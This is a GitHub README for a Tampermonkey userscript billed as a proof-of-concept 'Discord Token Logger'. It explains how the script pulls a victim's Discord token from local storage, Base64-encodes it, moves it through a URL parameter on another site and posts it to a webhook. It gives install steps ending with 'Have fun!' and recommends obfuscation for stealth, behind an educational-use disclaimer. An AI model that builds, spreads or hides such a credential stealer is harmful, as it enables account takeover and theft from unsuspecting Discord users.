<h1 align="center">Proof of Concept Tampermonkey Discord Token Logger</h1>

<p align="center">A demonstration tool to highlight the vulnerability of Discord accounts by logging user tokens.</p>

<div align="center">
    <a href="https://lyzev.github.io/discord/"><img src="https://img.shields.io/discord/610120595765723137?logo=discord" alt="Discord"/></a>
    <br><br>
    <img src="https://img.shields.io/github/last-commit/Lyzev/DiscordTokenLogger" alt="GitHub last commit"/>
    <img src="https://img.shields.io/github/commit-activity/w/Lyzev/DiscordTokenLogger" alt="GitHub commit activity"/>
    <br>
    <img src="https://img.shields.io/github/languages/code-size/Lyzev/DiscordTokenLogger" alt="GitHub code size in bytes"/>
    <img src="https://img.shields.io/github/contributors/Lyzev/DiscordTokenLogger" alt="GitHub contributors"/>
</div>

## Disclaimer
Please note, this repository is for educational and proof of concept purposes only. The information and code contained within it should not be used for any illegal or unethical activities. The contributors to this repository are not liable for any actions taken or damages caused by the use of the information or code provided here. It is the responsibility of the user to ensure compliance with all applicable laws and regulations, and to obtain any necessary permissions before using the code or information.

## How it works

### 1. Get the Token
The script activates on any site and puts you instantly on [discord.com](https://discord.com/channels/@me). There it gets the token out of the local storage.

### 2. Hide the Token
Then it uses [Base64](https://de.wikipedia.org/wiki/Base64) to encode the token.

### 3. Redirect to a different page
Now the script redirects to a different page (e.g.: [YouTube](https://youtube.com)) and adds an [URL Parameter](https://de.wikipedia.org/wiki/Query-String) which is the [Base64](https://de.wikipedia.org/wiki/Base64) encoded token.

### 4. Webhook Request
On the different page (e.g.: [YouTube](https://youtube.com)) the script gets the token out of the url ([URL Parameter](https://de.wikipedia.org/wiki/Query-String)) and decodes it with [Base64](https://de.wikipedia.org/wiki/Base64). Finally, it just sends the webhook request to the provided webhook url and adds the token in the content.

## Usage

### Install
1. Download the [DiscordTokenLogger.js](https://github.com/Lyzev/DiscordTokenLogger/releases/latest) file
2. Open Tampermonkey in your Browser
3. Go to the Utilities tab
4. Press the button 'Choose File' at 'Import from file'
5. Choose the downloaded [DiscordTokenLogger.js](https://github.com/Lyzev/DiscordTokenLogger/releases/latest) file
6. Click on install in the tab that has opened
7. Have fun!

### Obfuscation
The Discord Token Logger can be obfuscated with [obfuscator.io](https://obfuscator.io/) (and more) for added stealth. Keep in mind that hacking is unethical and illegal. Use this information responsibly.

## Bugs and Suggestions

### Discord
If you need support, you can join [this](https://lyzev.github.io/discord/) Discord server.

### GitHub
Bug reports and suggestions should be made in this repo's [issue tracker](https://github.com/Lyzev/DiscordTokenLogger/issues) using the templates provided. Please provide as much information as you can to best help us understand your issue and give a better chance of it being resolved.
